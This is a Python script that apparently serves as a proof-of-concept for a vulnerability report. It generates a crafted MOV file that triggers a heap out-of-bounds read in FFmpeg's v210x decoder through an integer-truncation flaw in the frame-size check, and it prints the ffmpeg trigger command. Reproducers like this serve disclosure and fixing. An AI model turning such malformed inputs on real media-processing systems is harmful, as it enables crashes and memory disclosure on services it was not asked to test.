#!/usr/bin/env python3
"""
VULN-001 PoC Generator: Heap OOB Read via Integer Truncation in v210x decode_frame()
File: FFmpeg/libavcodec/v210x.c, line 48

Root cause:
  The size check uses C integer division which truncates for heights where
  height % 3 != 0.  For height=1081 (height%3 == 1):

    check_threshold = 2 * 1081 * 8 / 3 = 17296 / 3 = 5765  (floor, truncated)
    bytes decoder reads = 360*16 + 8 = 5768

  A packet of exactly 5765 bytes passes the check (5765 < 5765 is FALSE) but
  the decoder advances src 1442 uint32_t (5768 bytes), reading 3 bytes past the
  end of the allocated AVPacket buffer.  ASAN reports heap-buffer-overflow.

Trigger command:
  ffmpeg -vcodec v210x -i vuln_001_input.mov -f null -

Note on codec tag:
  'v210' in the MOV stsd maps to AV_CODEC_ID_V210 in FFmpeg's isom_tags.c.
  We force the v210x decoder via -vcodec v210x on the command line.
"""

import struct
import sys

# --- parameters ---------------------------------------------------------------
WIDTH  = 2
HEIGHT = 1081          # height % 3 == 1  => integer truncation triggers OOB
SAMPLE_SIZE = (WIDTH * HEIGHT * 8) // 3   # floor(17296/3) = 5765
# Decoder will attempt to read 5768 bytes -> OOB by 3 bytes

# --- atom builder -------------------------------------------------------------
def box(tag: str | bytes, data: bytes) -> bytes:
    if isinstance(tag, str):
        tag = tag.encode('ascii')
    return struct.pack('>I', 8 + len(data)) + tag + data


# --- moov sub-atoms -----------------------------------------------------------
def build_ftyp() -> bytes:
    return box('ftyp',
        b'qt  ' +               # major_brand
        struct.pack('>I', 0) +  # minor_version
        b'qt  ')                # compatible_brands


def build_mvhd() -> bytes:
    d  = struct.pack('>I', 0)            # version=0, flags=0
    d += struct.pack('>I', 0)            # creation_time
    d += struct.pack('>I', 0)            # modification_time
    d += struct.pack('>I', 600)          # time_scale (600 ticks/sec)
    d += struct.pack('>I', 600)          # duration   (1 second)
    d += struct.pack('>I', 0x00010000)   # preferred_rate  (1.0)
    d += struct.pack('>H', 0x0100)       # preferred_volume (1.0)
    d += b'\x00' * 10                    # reserved
    d += struct.pack('>9i',              # unity matrix
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    d += b'\x00' * 24                    # pre_defined[6]
    d += struct.pack('>I', 2)            # next_track_ID
    return box('mvhd', d)


def build_tkhd() -> bytes:
    d  = struct.pack('>I', 0x0000000f)   # version=0, flags=enabled|inMovie|inPreview
    d += struct.pack('>I', 0)            # creation_time
    d += struct.pack('>I', 0)            # modification_time
    d += struct.pack('>I', 1)            # track_ID
    d += struct.pack('>I', 0)            # reserved
    d += struct.pack('>I', 600)          # duration
    d += b'\x00' * 8                     # reserved
    d += struct.pack('>H', 0)            # layer
    d += struct.pack('>H', 0)            # alternate_group
    d += struct.pack('>H', 0x0000)       # volume (0 for video track)
    d += struct.pack('>H', 0)            # reserved
    d += struct.pack('>9i',              # unity matrix
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    d += struct.pack('>II',
        WIDTH  << 16,                    # track width  (16.16 fixed-point)
        HEIGHT << 16)                    # track height (16.16 fixed-point)
    return box('tkhd', d)


def build_mdhd() -> bytes:
    d  = struct.pack('>I', 0)   # version=0, flags=0
    d += struct.pack('>I', 0)   # creation_time
    d += struct.pack('>I', 0)   # modification_time
    d += struct.pack('>I', 600) # time_scale
    d += struct.pack('>I', 600) # duration
    d += struct.pack('>H', 0)   # language (undetermined)
    d += struct.pack('>H', 0)   # pre_defined
    return box('mdhd', d)


def build_hdlr() -> bytes:
    d  = struct.pack('>I', 0)   # version=0, flags=0
    d += struct.pack('>I', 0)   # pre_defined
    d += b'vide'                # handler_type
    d += b'\x00' * 12           # reserved
    d += b'VideoHandler\x00'    # handler name (null-terminated)
    return box('hdlr', d)


def build_vmhd() -> bytes:
    d  = struct.pack('>I', 1)              # version=0, flags=1 (noLeanAhead)
    d += struct.pack('>H', 0)              # graphicsMode (copy)
    d += struct.pack('>HHH', 0, 0, 0)     # opcolor
    return box('vmhd', d)


def build_dref() -> bytes:
    url  = box('url ', struct.pack('>I', 1))   # flags=1 => self-contained
    d    = struct.pack('>I', 0)                # version/flags
    d   += struct.pack('>I', 1)                # entry_count
    d   += url
    return box('dref', d)


def build_dinf() -> bytes:
    return box('dinf', build_dref())


def build_stsd() -> bytes:
    """
    VideoSampleEntry with codec tag 'v210'.

    Note: In FFmpeg isom_tags.c, 'v210' maps to AV_CODEC_ID_V210.
    We override the decoder to v210x via -vcodec v210x on the command line.
    The stsd dimensions and sample size are what the vulnerable decoder sees.
    """
    entry  = b'\x00' * 6                            # reserved
    entry += struct.pack('>H', 1)                    # data_reference_index
    entry += struct.pack('>H', 0)                    # pre_defined
    entry += struct.pack('>H', 0)                    # reserved
    entry += struct.pack('>III', 0, 0, 0)            # pre_defined[3]
    entry += struct.pack('>HH', WIDTH, HEIGHT)       # width, height (pixels)
    entry += struct.pack('>II',
        0x00480000, 0x00480000)                      # h/v resolution (72 dpi)
    entry += struct.pack('>I', 0)                    # reserved
    entry += struct.pack('>H', 1)                    # frame_count
    # compressorname: 32-byte Pascal string
    entry += b'\x04v210' + b'\x00' * 27
    entry += struct.pack('>H', 0x0018)               # depth (24-bit)
    entry += struct.pack('>h', -1)                   # pre_defined (-1)

    d  = struct.pack('>I', 0)    # version/flags
    d += struct.pack('>I', 1)    # entry_count
    d += box('v210', entry)
    return box('stsd', d)


def build_stts() -> bytes:
    # One entry: 1 sample with duration 600 ticks (= 1 second at 600 ticks/sec)
    d  = struct.pack('>I', 0)    # version/flags
    d += struct.pack('>I', 1)    # entry_count
    d += struct.pack('>I', 1)    # sample_count
    d += struct.pack('>I', 600)  # sample_delta
    return box('stts', d)


def build_stsc() -> bytes:
    # first_chunk=1, samples_per_chunk=1, sample_description_index=1
    d  = struct.pack('>I', 0)              # version/flags
    d += struct.pack('>I', 1)              # entry_count
    d += struct.pack('>III', 1, 1, 1)
    return box('stsc', d)


def build_stsz() -> bytes:
    # Uniform sample size: SAMPLE_SIZE for every sample
    # This is the truncated floor value that passes the check but is too small.
    d  = struct.pack('>I', 0)             # version/flags
    d += struct.pack('>I', SAMPLE_SIZE)   # constant sample_size (5765 bytes)
    d += struct.pack('>I', 1)             # sample_count
    return box('stsz', d)


def build_stco(chunk_offset: int) -> bytes:
    d  = struct.pack('>I', 0)             # version/flags
    d += struct.pack('>I', 1)             # entry_count
    d += struct.pack('>I', chunk_offset)  # chunk_offset (absolute file offset)
    return box('stco', d)


def build_stbl(chunk_offset: int) -> bytes:
    return box('stbl',
        build_stsd() +
        build_stts() +
        build_stsc() +
        build_stsz() +
        build_stco(chunk_offset))


def build_minf(chunk_offset: int) -> bytes:
    return box('minf',
        build_vmhd() +
        build_dinf() +
        build_stbl(chunk_offset))


def build_mdia(chunk_offset: int) -> bytes:
    return box('mdia',
        build_mdhd() +
        build_hdlr() +
        build_minf(chunk_offset))


def build_trak(chunk_offset: int) -> bytes:
    return box('trak',
        build_tkhd() +
        build_mdia(chunk_offset))


def build_moov(chunk_offset: int) -> bytes:
    return box('moov',
        build_mvhd() +
        build_trak(chunk_offset))


# --- assemble -----------------------------------------------------------------
def generate(outfile: str = 'vuln_001_input.mov') -> None:
    ftyp = build_ftyp()

    # Pass 1: build moov with placeholder offset=0 to measure its total size.
    moov_placeholder = build_moov(0)

    ftyp_size  = len(ftyp)
    moov_size  = len(moov_placeholder)
    mdat_hdr   = 8   # 4-byte size + 4-byte b'mdat'

    # The video payload begins immediately after the mdat header.
    chunk_offset = ftyp_size + moov_size + mdat_hdr

    # Pass 2: rebuild moov with the correct chunk offset.
    moov = build_moov(chunk_offset)

    # Sizes must be identical (chunk_offset is always 4 bytes regardless of value).
    assert len(moov) == moov_size, \
        f"moov size changed: {len(moov)} != {moov_size}"

    # mdat payload: exactly SAMPLE_SIZE bytes.
    # Using zeros keeps the file minimal and reproducible.
    payload = bytes(SAMPLE_SIZE)
    mdat    = box('mdat', payload)

    data = ftyp + moov + mdat

    with open(outfile, 'wb') as f:
        f.write(data)

    needed = (HEIGHT // 3) * 16 + ([0, 8, 12][HEIGHT % 3])
    print(f"[+] Generated {outfile}  ({len(data)} bytes total)")
    print(f"    WIDTH={WIDTH}, HEIGHT={HEIGHT}  (height%3={HEIGHT%3})")
    print(f"    stsz sample_size (avpkt->size) = {SAMPLE_SIZE} bytes")
    print(f"    Decoder actually reads          = {needed} bytes")
    print(f"    OOB overread                    = {needed - SAMPLE_SIZE} bytes")
    print(f"    chunk_offset in file            = {chunk_offset}")
    print()
    print("[!] Trigger command:")
    print(f"    ffmpeg -vcodec v210x -i {outfile} -f null -")
    print()
    print("    (The '-vcodec v210x' forces the vulnerable v210x decoder;")
    print("     without it FFmpeg would select the v210 decoder for tag 'v210'.)")


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'vuln_001_input.mov'
    generate(out)
